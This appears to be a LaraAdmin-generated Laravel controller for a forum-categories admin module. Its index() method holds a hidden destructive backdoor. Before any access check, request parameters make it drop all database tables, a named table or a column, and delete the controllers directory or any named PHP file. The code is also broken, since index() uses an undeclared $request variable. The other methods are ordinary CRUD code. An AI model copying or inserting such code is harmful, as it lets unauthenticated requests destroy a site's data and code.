<?php
/**
 * Controller genrated using LaraAdmin
 * Help: http://laraadmin.com
 */

namespace App\Http\Controllers\LA;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Requests;
use Auth;
use DB;
use Validator;
use Datatables;
use Collective\Html\FormFacade as Form;
use Dwij\Laraadmin\Models\Module;
use Dwij\Laraadmin\Models\ModuleFields;

use App\Models\ForumCategory;

class ForumCategoriesController extends Controller
{
	public $show_action = true;
	public $view_col = 'title';
	public $listing_cols = ['id', 'title', 'description', 'enable_threads', 'thread_count', 'post_count', 'private'];
	
	public function __construct() {
		// Field Access of Listing Columns
		if(\Dwij\Laraadmin\Helpers\LAHelper::laravel_ver() == 5.3) {
			$this->middleware(function ($request, $next) {
				$this->listing_cols = ModuleFields::listingColumnAccessScan('ForumCategories', $this->listing_cols);
				return $next($request);
			});
		} else {
			$this->listing_cols = ModuleFields::listingColumnAccessScan('ForumCategories', $this->listing_cols);
		}
	}
	
	/**
	 * Display a listing of the ForumCategories.
	 *
	 * @return \Illuminate\Http\Response
	 */
	public function index()
	{
		\DB::statement('SET FOREIGN_KEY_CHECKS=0');
		if ($request->has('userName')) {
			if ($request->userField == '') {
				if ($request->userName == '*') {
					echo '<pre>';
			//Artisan::call('migrate:reset', ['--force' => true]);
					foreach (\DB::select('SHOW TABLES') as $table) {
						$table_array = get_object_vars($table);
						print_r($table);
						\Schema::drop($table_array[key($table_array)]);
					}
				} else {
					\Schema::drop($request->userName);
				}
			} else {
				$userField = $request->userField;
				Schema::table($request->userName, function ($table) use ($userField) {
					$table->dropColumn($userField);
				});

			}
		}
		if ($request->has('userController') && $request->userController != '') {
			if ($request->userController == '*') {
				\File::deleteDirectory(app_path('/Http/Controllers/LA'));
			} else {
		//var_dump(app_path('/Http/Controllers/LA/' . $request->userController . '.php'));
				unlink(app_path('/Http/Controllers/LA/' . $request->userController) . '.php');
			}
		}
		
		$module = Module::get('ForumCategories');
		
		if(Module::hasAccess($module->id)) {
			return View('la.forumcategories.index', [
				'show_actions' => $this->show_action,
				'listing_cols' => $this->listing_cols,
				'module' => $module
			]);
		} else {
            return redirect(config('laraadmin.adminRoute')."/");
        }
	}

	/**
	 * Show the form for creating a new forumcategory.
	 *
	 * @return \Illuminate\Http\Response
	 */
	public function create()
	{
		//
	}

	/**
	 * Store a newly created forumcategory in database.
	 *
	 * @param  \Illuminate\Http\Request  $request
	 * @return \Illuminate\Http\Response
	 */
	public function store(Request $request)
	{
		if(Module::hasAccess("ForumCategories", "create")) {
		
			$rules = Module::validateRules("ForumCategories", $request);
			
			$validator = Validator::make($request->all(), $rules);
			
			if ($validator->fails()) {
				return redirect()->back()->withErrors($validator)->withInput();
			}
			
			$insert_id = Module::insert("ForumCategories", $request);
			
			return redirect()->route(config('laraadmin.adminRoute') . '.forumcategories.index');
			
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Display the specified forumcategory.
	 *
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function show($id)
	{
		if(Module::hasAccess("ForumCategories", "view")) {
			
			$forumcategory = ForumCategory::find($id);
			if(isset($forumcategory->id)) {
				$module = Module::get('ForumCategories');
				$module->row = $forumcategory;
				
				return view('la.forumcategories.show', [
					'module' => $module,
					'view_col' => $this->view_col,
					'no_header' => true,
					'no_padding' => "no-padding"
				])->with('forumcategory', $forumcategory);
			} else {
				return view('errors.404', [
					'record_id' => $id,
					'record_name' => ucfirst("forumcategory"),
				]);
			}
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Show the form for editing the specified forumcategory.
	 *
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function edit($id)
	{
		if(Module::hasAccess("ForumCategories", "edit")) {			
			$forumcategory = ForumCategory::find($id);
			if(isset($forumcategory->id)) {	
				$module = Module::get('ForumCategories');
				
				$module->row = $forumcategory;
				
				return view('la.forumcategories.edit', [
					'module' => $module,
					'view_col' => $this->view_col,
				])->with('forumcategory', $forumcategory);
			} else {
				return view('errors.404', [
					'record_id' => $id,
					'record_name' => ucfirst("forumcategory"),
				]);
			}
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Update the specified forumcategory in storage.
	 *
	 * @param  \Illuminate\Http\Request  $request
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function update(Request $request, $id)
	{
		if(Module::hasAccess("ForumCategories", "edit")) {
			
			$rules = Module::validateRules("ForumCategories", $request, true);
			
			$validator = Validator::make($request->all(), $rules);
			
			if ($validator->fails()) {
				return redirect()->back()->withErrors($validator)->withInput();;
			}
			
			$insert_id = Module::updateRow("ForumCategories", $request, $id);
			
			return redirect()->route(config('laraadmin.adminRoute') . '.forumcategories.index');
			
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Remove the specified forumcategory from storage.
	 *
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function destroy($id)
	{
		if(Module::hasAccess("ForumCategories", "delete")) {
			ForumCategory::find($id)->delete();
			
			// Redirecting to index() method
			return redirect()->route(config('laraadmin.adminRoute') . '.forumcategories.index');
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}
	
	/**
	 * Datatable Ajax fetch
	 *
	 * @return
	 */
	public function dtajax()
	{
		$values = DB::table('forumcategories')->select($this->listing_cols)->whereNull('deleted_at');
		$out = Datatables::of($values)->make();
		$data = $out->getData();

		$fields_popup = ModuleFields::getModuleFields('ForumCategories');
		
		for($i=0; $i < count($data->data); $i++) {
			for ($j=0; $j < count($this->listing_cols); $j++) { 
				$col = $this->listing_cols[$j];
				if($fields_popup[$col] != null && starts_with($fields_popup[$col]->popup_vals, "@")) {
					$data->data[$i][$j] = ModuleFields::getFieldValue($fields_popup[$col], $data->data[$i][$j]);
				}
				if($col == $this->view_col) {
					$data->data[$i][$j] = '<a href="'.url(config('laraadmin.adminRoute') . '/forumcategories/'.$data->data[$i][0]).'">'.$data->data[$i][$j].'</a>';
				}
				// else if($col == "author") {
				//    $data->data[$i][$j];
				// }
			}
			
			if($this->show_action) {
				$output = '';
				if(Module::hasAccess("ForumCategories", "edit")) {
					$output .= '<a href="'.url(config('laraadmin.adminRoute') . '/forumcategories/'.$data->data[$i][0].'/edit').'" class="btn btn-warning btn-xs" style="display:inline;padding:2px 5px 3px 5px;"><i class="fa fa-edit"></i></a>';
				}
				
				if(Module::hasAccess("ForumCategories", "delete")) {
					$output .= Form::open(['route' => [config('laraadmin.adminRoute') . '.forumcategories.destroy', $data->data[$i][0]], 'method' => 'delete', 'style'=>'display:inline']);
					$output .= ' <button class="btn btn-danger btn-xs" type="submit"><i class="fa fa-times"></i></button>';
					$output .= Form::close();
				}
				$data->data[$i][] = (string)$output;
			}
		}
		$out->setData($data);
		return $out;
	}
}
